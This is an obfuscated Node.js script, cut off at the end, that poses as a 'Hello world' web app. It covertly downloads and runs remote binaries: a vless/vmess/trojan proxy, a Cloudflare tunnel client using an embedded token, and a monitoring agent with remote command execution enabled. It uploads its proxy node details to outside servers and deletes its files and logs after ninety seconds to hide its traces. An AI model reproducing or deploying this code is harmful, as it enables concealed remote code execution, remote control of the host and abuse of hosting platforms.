const _0x32ae6f=_0x1e73;(function(_0x13fae0,_0x14fca8){const _0x5f2962=_0x1e73,_0x249272=_0x13fae0();while(!![]){try{const _0x6fd774=-parseInt(_0x5f2962(0x17d))/0x1*(-parseInt(_0x5f2962(0x1e5))/0x2)+parseInt(_0x5f2962(0x18e))/0x3+parseInt(_0x5f2962(0x1c6))/0x4*(-parseInt(_0x5f2962(0x1e6))/0x5)+parseInt(_0x5f2962(0x1b1))/0x6+-parseInt(_0x5f2962(0x132))/0x7+parseInt(_0x5f2962(0x134))/0x8*(parseInt(_0x5f2962(0x180))/0x9)+parseInt(_0x5f2962(0x1c3))/0xa*(-parseInt(_0x5f2962(0x1b3))/0xb);if(_0x6fd774===_0x14fca8)break;else _0x249272['push'](_0x249272['shift']());}catch(_0xc1a716){_0x249272['push'](_0x249272['shift']());}}}(_0x2245,0x2f7d2));const express=require(_0x32ae6f(0x14f)),app=express(),axios=require(_0x32ae6f(0x1c2)),os=require('os'),fs=require('fs'),path=require(_0x32ae6f(0x18b)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x32ae6f(0x194)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x32ae6f(0x191)][_0x32ae6f(0x170)]||'',PROJECT_URL=process[_0x32ae6f(0x191)][_0x32ae6f(0x19b)]||'',AUTO_ACCESS=process[_0x32ae6f(0x191)][_0x32ae6f(0x161)]||![],FILE_PATH=process[_0x32ae6f(0x191)][_0x32ae6f(0x171)]||'./tmp',SUB_PATH=process[_0x32ae6f(0x191)][_0x32ae6f(0x1b4)]||'sub',PORT=process['env'][_0x32ae6f(0x1e9)]||process[_0x32ae6f(0x191)][_0x32ae6f(0x1ef)]||0xbb8,UUID=process[_0x32ae6f(0x191)][_0x32ae6f(0x1ec)]||_0x32ae6f(0x19e),NEZHA_SERVER=process[_0x32ae6f(0x191)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x32ae6f(0x1d6)]||'',NEZHA_KEY=process[_0x32ae6f(0x191)][_0x32ae6f(0x160)]||'',ARGO_DOMAIN=process[_0x32ae6f(0x191)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x32ae6f(0x191)][_0x32ae6f(0x1c9)]||_0x32ae6f(0x15b),ARGO_PORT=process[_0x32ae6f(0x191)][_0x32ae6f(0x18a)]||0x1f41,CFIP=process[_0x32ae6f(0x191)][_0x32ae6f(0x151)]||_0x32ae6f(0x1b5),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x32ae6f(0x191)][_0x32ae6f(0x1e0)]||'CF';!fs['existsSync'](FILE_PATH)?(fs[_0x32ae6f(0x1f0)](FILE_PATH),console['log'](FILE_PATH+_0x32ae6f(0x1c5))):console[_0x32ae6f(0x1b2)](FILE_PATH+_0x32ae6f(0x1dc));function generateRandomName(){const _0x22d603=_0x32ae6f,_0x2097de='abcdefghijklmnopqrstuvwxyz';let _0x47f41b='';for(let _0x4b90e4=0x0;_0x4b90e4<0x6;_0x4b90e4++){_0x47f41b+=_0x2097de[_0x22d603(0x149)](Math['floor'](Math[_0x22d603(0x1eb)]()*_0x2097de['length']));}return _0x47f41b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x32ae6f(0x1da)](FILE_PATH,npmName),phpPath=path[_0x32ae6f(0x1da)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x32ae6f(0x1da)](FILE_PATH,_0x32ae6f(0x164)),bootLogPath=path[_0x32ae6f(0x1da)](FILE_PATH,_0x32ae6f(0x139)),configPath=path[_0x32ae6f(0x1da)](FILE_PATH,_0x32ae6f(0x1a5));function _0x2245(){const _0x4704e2=['pop','tunnel.yml','vless','UPLOAD_URL','FILE_PATH','\x0a\x20\x20credentials-file:\x20','npm\x20running\x20error:\x20','config.yaml','Skipping\x20adding\x20automatic\x20access\x20task','--tls','map','https://arm64.ssss.nyc.mn/web','Unhandled\x20error\x20in\x20startserver:','send','filter','readFileSync','365147Vjjgmv','rm\x20-rf\x20','Download\x20','330615nSCMts','\x20successfully','statSync','test','2096','127.0.0.1','firefox','NEZHA\x20variable\x20is\x20empty,skip\x20running','&fp=firefox&type=ws&host=','Nodes\x20uploaded\x20successfully','ARGO_PORT','path','http://ip-api.com/json/','/api/add-nodes','828618EQQPqf','TunnelSecret','\x20-c\x20','env','quic','message','exec','Empowerment\x20failed\x20for\x20','arch','then','\x22\x20>\x20/dev/null\x202>&1','/vmess-argo','2087','PROJECT_URL','country_code','blackhole','6c731abe-ce88-42ed-8c82-6269fe80de48','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20\x20\x20','/dev/null','response','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','false','config.json','/vmess-argo?ed=2560','has','forEach','org','443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20-p\x20','vmess','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','toString','taskkill\x20/f\x20/im\x20','134310Adesti','log','1662793DSAXBx','SUB_PATH','cdns.doon.eu.org','chmod','Error\x20reading\x20boot.log:','/sub.txt\x20saved\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','stream','automatic\x20access\x20task\x20added\x20successfully','2053','existsSync','/trojan-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','win32','&path=%2Fvless-argo%3Fed%3D2560#','axios','10TwlYpH','unshift','\x20is\x20created','832VtOFGo','&path=%2Ftrojan-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/bot','ARGO_AUTH','aarch64','all','none','\x0a\x0avmess://','http','platform','utf-8','basename','application/json','push','App\x20is\x20running','includes','NEZHA_PORT','match','https://amd64.ssss.nyc.mn/bot','ArgoDomain:','join','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20already\x20exists','Error\x20executing\x20command:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20>\x20nul\x202>&1','NAME','Hello\x20world!','freedom','split','\x20>/dev/null\x202>&1','2KpPzAx','4035bMfuug','text/plain;\x20charset=utf-8','block','SERVER_PORT','fileUrl','random','UUID','true','Error\x20downloading\x20files:','PORT','mkdirSync','?security=tls&sni=','post','close','base64','length','data','2080015sIqGYU','https://oooo.serv00.net/add-url','32YMfjIB','https://amd64.ssss.nyc.mn/agent','.exe\x20>\x20nul\x202>&1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tcp','boot.log','/config.json\x20>/dev/null\x202>&1\x20&','from','\x0aclient_secret:\x20','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/api/delete-nodes','error','catch','direct','Add\x20automatic\x20access\x20task\x20faild:\x20','writeFileSync','stringify','arm','charAt','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','clear','createWriteStream','nohup\x20','success','express','Error\x20in\x20startserver:','CFIP','pkill\x20-f\x20\x22[','2083','countryCode','readdirSync','/tunnel.yml\x20run','Empowerment\x20success\x20for\x20','https://amd64.ssss.nyc.mn/v1','del\x20/f\x20/q\x20','\x20>/dev/null\x202>&1\x20&','eyJhIjoiODYxYjc4MzY0Y2RjMzdmNzNlMzg1NDBkZmQ3NDNkMDgiLCJ0IjoiOGI0MmMyOWYtYzFhNy00Y2EzLTg5YmQtMzNiMjVhOWVmMzgwIiwicyI6IllqRmhZbU13WkRVdE5qRXlNaTAwT1RSa0xUbGxPV1F0TW1NeE1tRmxOell6WVdGaiJ9','Content-Type','xtls-rprx-vision','web\x20running\x20error:\x20','Unknown','NEZHA_KEY','AUTO_ACCESS','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tls','list.txt','trojan','isFile','tunnel.json','status','\x20is\x20running','8443','get','\x20failed:\x20'];_0x2245=function(){return _0x4704e2;};return _0x2245();}function deleteNodes(){const _0x59a306=_0x32ae6f;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x179166;try{_0x179166=fs[_0x59a306(0x17c)](subPath,_0x59a306(0x1d0));}catch{return null;}const _0x1afd2f=Buffer[_0x59a306(0x13b)](_0x179166,_0x59a306(0x12f))['toString'](_0x59a306(0x1d0)),_0x1117ad=_0x1afd2f[_0x59a306(0x1e3)]('\x0a')[_0x59a306(0x17b)](_0xced86a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xced86a));if(_0x1117ad[_0x59a306(0x130)]===0x0)return;return axios['post'](UPLOAD_URL+_0x59a306(0x141),JSON['stringify']({'nodes':_0x1117ad}),{'headers':{'Content-Type':'application/json'}})[_0x59a306(0x143)](_0x379712=>{return null;}),null;}catch(_0x49b20d){return null;}}function cleanupOldFiles(){const _0x55ca6c=_0x32ae6f;try{const _0x39e71a=fs[_0x55ca6c(0x155)](FILE_PATH);_0x39e71a[_0x55ca6c(0x1a8)](_0x105452=>{const _0xa1cb6d=_0x55ca6c,_0x16593a=path[_0xa1cb6d(0x1da)](FILE_PATH,_0x105452);try{const _0x4e3b1e=fs[_0xa1cb6d(0x182)](_0x16593a);_0x4e3b1e[_0xa1cb6d(0x166)]()&&fs['unlinkSync'](_0x16593a);}catch(_0xe0360a){}});}catch(_0x1ccbae){}}app[_0x32ae6f(0x16b)]('/',function(_0x473669,_0xe7e1eb){const _0x3d8e5e=_0x32ae6f;_0xe7e1eb[_0x3d8e5e(0x17a)](_0x3d8e5e(0x1e1));});async function generateConfig(){const _0x8f2805=_0x32ae6f,_0x108d54={'log':{'access':'/dev/null','error':_0x8f2805(0x1a1),'loglevel':_0x8f2805(0x1cc)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x8f2805(0x15d)}],'decryption':_0x8f2805(0x1cc),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x8f2805(0x199),'dest':0xbbb},{'path':_0x8f2805(0x1be),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x8f2805(0x185),'protocol':_0x8f2805(0x16f),'settings':{'clients':[{'id':UUID}],'decryption':_0x8f2805(0x1cc)},'streamSettings':{'network':_0x8f2805(0x138),'security':_0x8f2805(0x1cc)}},{'port':0xbba,'listen':_0x8f2805(0x185),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x8f2805(0x1cc)},'streamSettings':{'network':'ws','security':_0x8f2805(0x1cc),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x8f2805(0x192)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x8f2805(0x185),'protocol':_0x8f2805(0x1ad),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x8f2805(0x1ce),_0x8f2805(0x163),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x8f2805(0x185),'protocol':_0x8f2805(0x165),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x8f2805(0x1cc),'wsSettings':{'path':_0x8f2805(0x1be)}},'sniffing':{'enabled':!![],'destOverride':[_0x8f2805(0x1ce),'tls',_0x8f2805(0x192)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x8f2805(0x1e2),'tag':_0x8f2805(0x144)},{'protocol':_0x8f2805(0x19d),'tag':_0x8f2805(0x1e8)}]};fs[_0x8f2805(0x146)](path[_0x8f2805(0x1da)](FILE_PATH,'config.json'),JSON[_0x8f2805(0x147)](_0x108d54,null,0x2));}function getSystemArchitecture(){const _0x50cc3f=_0x32ae6f,_0xd470de=os[_0x50cc3f(0x196)]();return _0xd470de==='arm'||_0xd470de==='arm64'||_0xd470de===_0x50cc3f(0x1ca)?_0x50cc3f(0x148):'amd';}function downloadFile(_0x36faac,_0x1e3424,_0x510ade){const _0x1ab88b=_0x32ae6f,_0x19e8dc=_0x36faac;!fs[_0x1ab88b(0x1bd)](FILE_PATH)&&fs[_0x1ab88b(0x1f0)](FILE_PATH,{'recursive':!![]});const _0x24db29=fs[_0x1ab88b(0x14c)](_0x19e8dc);axios({'method':'get','url':_0x1e3424,'responseType':_0x1ab88b(0x1ba)})[_0x1ab88b(0x197)](_0x3f036d=>{const _0x2f0337=_0x1ab88b;_0x3f036d[_0x2f0337(0x131)]['pipe'](_0x24db29),_0x24db29['on']('finish',()=>{const _0x109ce2=_0x2f0337;_0x24db29[_0x109ce2(0x12e)](),console[_0x109ce2(0x1b2)](_0x109ce2(0x17f)+path[_0x109ce2(0x1d1)](_0x19e8dc)+_0x109ce2(0x181)),_0x510ade(null,_0x19e8dc);}),_0x24db29['on'](_0x2f0337(0x142),_0x40dd45=>{const _0x13989d=_0x2f0337;fs['unlink'](_0x19e8dc,()=>{});const _0x11e629=_0x13989d(0x17f)+path[_0x13989d(0x1d1)](_0x19e8dc)+_0x13989d(0x16c)+_0x40dd45[_0x13989d(0x193)];console[_0x13989d(0x142)](_0x11e629),_0x510ade(_0x11e629);});})[_0x1ab88b(0x143)](_0x2efc5c=>{const _0x5c9124=_0x1ab88b,_0x588e3d=_0x5c9124(0x17f)+path['basename'](_0x19e8dc)+_0x5c9124(0x16c)+_0x2efc5c[_0x5c9124(0x193)];console[_0x5c9124(0x142)](_0x588e3d),_0x510ade(_0x588e3d);});}async function downloadFilesAndRun(){const _0x38caed=_0x32ae6f,_0x12a91e=getSystemArchitecture(),_0x448136=getFilesForArchitecture(_0x12a91e);if(_0x448136[_0x38caed(0x130)]===0x0){console[_0x38caed(0x1b2)](_0x38caed(0x13f));return;}const _0x15c545=_0x448136[_0x38caed(0x177)](_0xd125a7=>{return new Promise((_0x4be2f5,_0x326b60)=>{const _0x3debfe=_0x1e73;downloadFile(_0xd125a7['fileName'],_0xd125a7[_0x3debfe(0x1ea)],(_0x1e636e,_0x2f90b2)=>{_0x1e636e?_0x326b60(_0x1e636e):_0x4be2f5(_0x2f90b2);});});});try{await Promise[_0x38caed(0x1cb)](_0x15c545);}catch(_0x205143){console[_0x38caed(0x142)](_0x38caed(0x1ee),_0x205143);return;}function _0xac5e37(_0x2dc9b2){const _0x3ebff4=_0x38caed,_0x376be5=0x1fd;_0x2dc9b2[_0x3ebff4(0x1a8)](_0x4f6c9d=>{const _0xd6e413=_0x3ebff4;fs['existsSync'](_0x4f6c9d)&&fs[_0xd6e413(0x1b6)](_0x4f6c9d,_0x376be5,_0x9a0a73=>{const _0x107c83=_0xd6e413;_0x9a0a73?console[_0x107c83(0x142)](_0x107c83(0x195)+_0x4f6c9d+':\x20'+_0x9a0a73):console[_0x107c83(0x1b2)](_0x107c83(0x157)+_0x4f6c9d+':\x20'+_0x376be5[_0x107c83(0x1af)](0x8));});});}const _0x32bd0b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xac5e37(_0x32bd0b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xfd976d=NEZHA_SERVER[_0x38caed(0x1d5)](':')?NEZHA_SERVER[_0x38caed(0x1e3)](':')[_0x38caed(0x16d)]():'',_0x2d6d85=new Set([_0x38caed(0x1aa),_0x38caed(0x16a),_0x38caed(0x184),_0x38caed(0x19a),_0x38caed(0x153),'2053']),_0x412270=_0x2d6d85[_0x38caed(0x1a7)](_0xfd976d)?_0x38caed(0x1ed):_0x38caed(0x1a4),_0x495002=_0x38caed(0x13c)+NEZHA_KEY+_0x38caed(0x1ab)+NEZHA_SERVER+_0x38caed(0x19f)+_0x412270+_0x38caed(0x1b9)+UUID;fs['writeFileSync'](path[_0x38caed(0x1da)](FILE_PATH,_0x38caed(0x174)),_0x495002);const _0x56f572=_0x38caed(0x14d)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x38caed(0x1ae);try{await exec(_0x56f572),console[_0x38caed(0x1b2)](phpName+_0x38caed(0x169)),await new Promise(_0x116acf=>setTimeout(_0x116acf,0x3e8));}catch(_0x13dcd0){console[_0x38caed(0x142)]('php\x20running\x20error:\x20'+_0x13dcd0);}}else{let _0x45a09b='';const _0x177b8f=[_0x38caed(0x1aa),_0x38caed(0x16a),_0x38caed(0x184),_0x38caed(0x19a),_0x38caed(0x153),_0x38caed(0x1bc)];_0x177b8f[_0x38caed(0x1d5)](NEZHA_PORT)&&(_0x45a09b=_0x38caed(0x176));const _0x56f835=_0x38caed(0x14d)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x38caed(0x1ac)+NEZHA_KEY+'\x20'+_0x45a09b+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x56f835),console[_0x38caed(0x1b2)](npmName+_0x38caed(0x169)),await new Promise(_0x33d4af=>setTimeout(_0x33d4af,0x3e8));}catch(_0x2fc511){console['error'](_0x38caed(0x173)+_0x2fc511);}}}else console[_0x38caed(0x1b2)](_0x38caed(0x187));const _0x5e9188=_0x38caed(0x14d)+webPath+_0x38caed(0x190)+FILE_PATH+_0x38caed(0x13a);try{await exec(_0x5e9188),console[_0x38caed(0x1b2)](webName+'\x20is\x20running'),await new Promise(_0x44cfec=>setTimeout(_0x44cfec,0x3e8));}catch(_0x2bb2f8){console[_0x38caed(0x142)](_0x38caed(0x15e)+_0x2bb2f8);}if(fs[_0x38caed(0x1bd)](botPath)){let _0x12242f;if(ARGO_AUTH[_0x38caed(0x1d7)](/^[A-Z0-9a-z=]{120,250}$/))_0x12242f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x38caed(0x1d7)](/TunnelSecret/)?_0x12242f=_0x38caed(0x162)+FILE_PATH+_0x38caed(0x156):_0x12242f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x12242f+_0x38caed(0x15a)),console[_0x38caed(0x1b2)](botName+_0x38caed(0x169)),await new Promise(_0x4b5264=>setTimeout(_0x4b5264,0x7d0));}catch(_0x3d60c3){console[_0x38caed(0x142)](_0x38caed(0x1dd)+_0x3d60c3);}}await new Promise(_0x10844b=>setTimeout(_0x10844b,0x1388));}function getFilesForArchitecture(_0x300d03){const _0x466e3e=_0x32ae6f;let _0x4558e3;_0x300d03===_0x466e3e(0x148)?_0x4558e3=[{'fileName':webPath,'fileUrl':_0x466e3e(0x178)},{'fileName':botPath,'fileUrl':_0x466e3e(0x1c8)}]:_0x4558e3=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x466e3e(0x1d8)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x272566=_0x300d03==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x466e3e(0x135);_0x4558e3[_0x466e3e(0x1c4)]({'fileName':npmPath,'fileUrl':_0x272566});}else{const _0x1b1de6=_0x300d03===_0x466e3e(0x148)?'https://arm64.ssss.nyc.mn/v1':_0x466e3e(0x158);_0x4558e3['unshift']({'fileName':phpPath,'fileUrl':_0x1b1de6});}}return _0x4558e3;}function argoType(){const _0x38e147=_0x32ae6f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x38e147(0x1b2)](_0x38e147(0x1a3));return;}if(ARGO_AUTH['includes'](_0x38e147(0x18f))){fs['writeFileSync'](path['join'](FILE_PATH,_0x38e147(0x167)),ARGO_AUTH);const _0x546ca1='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x38e147(0x1e3)]('\x22')[0xb]+_0x38e147(0x172)+path[_0x38e147(0x1da)](FILE_PATH,_0x38e147(0x167))+_0x38e147(0x137)+ARGO_DOMAIN+_0x38e147(0x13e)+ARGO_PORT+_0x38e147(0x14a);fs[_0x38e147(0x146)](path[_0x38e147(0x1da)](FILE_PATH,_0x38e147(0x16e)),_0x546ca1);}else console[_0x38e147(0x1b2)](_0x38e147(0x1bf));}async function extractDomains(){const _0x2e6d8f=_0x32ae6f;let _0x44ae57;if(ARGO_AUTH&&ARGO_DOMAIN)_0x44ae57=ARGO_DOMAIN,console[_0x2e6d8f(0x1b2)]('ARGO_DOMAIN:',_0x44ae57),await _0x4f6c51(_0x44ae57);else try{const _0x568361=fs[_0x2e6d8f(0x17c)](path[_0x2e6d8f(0x1da)](FILE_PATH,_0x2e6d8f(0x139)),'utf-8'),_0xb548ac=_0x568361[_0x2e6d8f(0x1e3)]('\x0a'),_0x1cb3e6=[];_0xb548ac[_0x2e6d8f(0x1a8)](_0x5667f1=>{const _0x1c72aa=_0x2e6d8f,_0x4080de=_0x5667f1[_0x1c72aa(0x1d7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4080de){const _0x330cfc=_0x4080de[0x1];_0x1cb3e6[_0x1c72aa(0x1d3)](_0x330cfc);}});if(_0x1cb3e6[_0x2e6d8f(0x130)]>0x0)_0x44ae57=_0x1cb3e6[0x0],console[_0x2e6d8f(0x1b2)](_0x2e6d8f(0x1d9),_0x44ae57),await _0x4f6c51(_0x44ae57);else{console['log'](_0x2e6d8f(0x1db)),fs['unlinkSync'](path[_0x2e6d8f(0x1da)](FILE_PATH,_0x2e6d8f(0x139)));async function _0x2b06cb(){const _0x341d6c=_0x2e6d8f;try{process[_0x341d6c(0x1cf)]===_0x341d6c(0x1c0)?await exec(_0x341d6c(0x1b0)+botName+_0x341d6c(0x136)):await exec(_0x341d6c(0x152)+botName[_0x341d6c(0x149)](0x0)+']'+botName['substring'](0x1)+_0x341d6c(0x198));}catch(_0x223c5c){}}_0x2b06cb(),await new Promise(_0x36ecef=>setTimeout(_0x36ecef,0xbb8));const _0x5f06b7='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2e6d8f(0x140)+ARGO_PORT;try{await exec(_0x2e6d8f(0x14d)+botPath+'\x20'+_0x5f06b7+'\x20>/dev/null\x202>&1\x20&'),console[_0x2e6d8f(0x1b2)](botName+_0x2e6d8f(0x169)),await new Promise(_0x26dea7=>setTimeout(_0x26dea7,0xbb8)),await extractDomains();}catch(_0x16baf6){console[_0x2e6d8f(0x142)](_0x2e6d8f(0x1dd)+_0x16baf6);}}}catch(_0x2fb4e6){console['error'](_0x2e6d8f(0x1b7),_0x2fb4e6);}async function _0x36b210(){const _0x544cd9=_0x2e6d8f;try{const _0x18440b=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x18440b[_0x544cd9(0x131)]&&_0x18440b[_0x544cd9(0x131)]['country_code']&&_0x18440b[_0x544cd9(0x131)][_0x544cd9(0x1a9)])return _0x18440b['data'][_0x544cd9(0x19c)]+'_'+_0x18440b[_0x544cd9(0x131)][_0x544cd9(0x1a9)];}catch(_0x4faced){try{const _0x478a48=await axios[_0x544cd9(0x16b)](_0x544cd9(0x18c),{'timeout':0xbb8});if(_0x478a48[_0x544cd9(0x131)]&&_0x478a48[_0x544cd9(0x131)][_0x544cd9(0x168)]===_0x544cd9(0x14e)&&_0x478a48[_0x544cd9(0x131)][_0x544cd9(0x154)]&&_0x478a48[_0x544cd9(0x131)][_0x544cd9(0x1a9)])return _0x478a48[_0x544cd9(0x131)][_0x544cd9(0x154)]+'_'+_0x478a48[_0x544cd9(0x131)]['org'];}catch(_0x5a930a){}}return _0x544cd9(0x15f);}async function _0x4f6c51(_0x4cf9ad){const _0xed7820=await _0x36b210(),_0x55db1c=NAME?NAME+'-'+_0xed7820:_0xed7820;return new Promise(_0x363560=>{setTimeout(()=>{const _0xdeddcd=_0x1e73,_0x2ff846={'v':'2','ps':''+_0x55db1c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xdeddcd(0x1cc),'net':'ws','type':'none','host':_0x4cf9ad,'path':_0xdeddcd(0x1a6),'tls':_0xdeddcd(0x163),'sni':_0x4cf9ad,'alpn':'','fp':_0xdeddcd(0x186)},_0x15717e='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4cf9ad+_0xdeddcd(0x188)+_0x4cf9ad+_0xdeddcd(0x1c1)+_0x55db1c+_0xdeddcd(0x1cd)+Buffer['from'](JSON[_0xdeddcd(0x147)](_0x2ff846))[_0xdeddcd(0x1af)](_0xdeddcd(0x12f))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0xdeddcd(0x12c)+_0x4cf9ad+_0xdeddcd(0x188)+_0x4cf9ad+_0xdeddcd(0x1c7)+_0x55db1c+_0xdeddcd(0x1a0);console[_0xdeddcd(0x1b2)](Buffer['from'](_0x15717e)['toString']('base64')),fs[_0xdeddcd(0x146)](subPath,Buffer[_0xdeddcd(0x13b)](_0x15717e)['toString'](_0xdeddcd(0x12f))),console[_0xdeddcd(0x1b2)](FILE_PATH+_0xdeddcd(0x1b8)),uploadNodes(),app[_0xdeddcd(0x16b)]('/'+SUB_PATH,(_0x5d386f,_0x1687f3)=>{const _0x595b26=_0xdeddcd,_0x1f3618=Buffer[_0x595b26(0x13b)](_0x15717e)[_0x595b26(0x1af)](_0x595b26(0x12f));_0x1687f3['set'](_0x595b26(0x15c),_0x595b26(0x1e7)),_0x1687f3[_0x595b26(0x17a)](_0x1f3618);}),_0x363560(_0x15717e);},0x7d0);});}}async function uploadNodes(){const _0x6febc7=_0x32ae6f;if(UPLOAD_URL&&PROJECT_URL){const _0x4fe4b1=PROJECT_URL+'/'+SUB_PATH,_0x3135c2={'subscription':[_0x4fe4b1]};try{const _0x548907=await axios[_0x6febc7(0x12d)](UPLOAD_URL+'/api/add-subscriptions',_0x3135c2,{'headers':{'Content-Type':_0x6febc7(0x1d2)}});return _0x548907&&_0x548907[_0x6febc7(0x168)]===0xc8?(console[_0x6febc7(0x1b2)]('Subscription\x20uploaded\x20successfully'),_0x548907):null;}catch(_0x4232db){if(_0x4232db[_0x6febc7(0x1a2)]){if(_0x4232db[_0x6febc7(0x1a2)][_0x6febc7(0x168)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xb8f193=fs[_0x6febc7(0x17c)](listPath,_0x6febc7(0x1d0)),_0x82eb=_0xb8f193[_0x6febc7(0x1e3)]('\x0a')[_0x6febc7(0x17b)](_0xef26cb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x6febc7(0x183)](_0xef26cb));if(_0x82eb[_0x6febc7(0x130)]===0x0)return;const _0x231f9f=JSON[_0x6febc7(0x147)]({'nodes':_0x82eb});try{const _0x5cbf4d=await axios[_0x6febc7(0x12d)](UPLOAD_URL+_0x6febc7(0x18d),_0x231f9f,{'headers':{'Content-Type':_0x6febc7(0x1d2)}});return _0x5cbf4d&&_0x5cbf4d[_0x6febc7(0x168)]===0xc8?(console[_0x6febc7(0x1b2)](_0x6febc7(0x189)),_0x5cbf4d):null;}catch(_0x4535ca){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x54fb45=_0x1e73,_0x562276=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x562276[_0x54fb45(0x1d3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x562276[_0x54fb45(0x1d3)](phpPath);process[_0x54fb45(0x1cf)]===_0x54fb45(0x1c0)?exec(_0x54fb45(0x159)+_0x562276['join']('\x20')+_0x54fb45(0x1df),_0x726b6f=>{const _0x5942fa=_0x54fb45;console[_0x5942fa(0x14b)](),console[_0x5942fa(0x1b2)](_0x5942fa(0x1d4)),console[_0x5942fa(0x1b2)](_0x5942fa(0x1de));}):exec(_0x54fb45(0x17e)+_0x562276[_0x54fb45(0x1da)]('\x20')+_0x54fb45(0x1e4),_0x2f2a54=>{const _0x178641=_0x54fb45;console['clear'](),console[_0x178641(0x1b2)](_0x178641(0x1d4)),console['log'](_0x178641(0x1de));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x433b27=_0x32ae6f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x433b27(0x1b2)](_0x433b27(0x175));return;}try{const _0x331213=await axios['post'](_0x433b27(0x133),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x433b27(0x1bb)),_0x331213;}catch(_0x385579){return console[_0x433b27(0x142)](_0x433b27(0x145)+_0x385579[_0x433b27(0x193)]),null;}}function _0x1e73(_0x5bd74d,_0x299a47){_0x5bd74d=_0x5bd74d-0x12c;const _0x2245cd=_0x2245();let 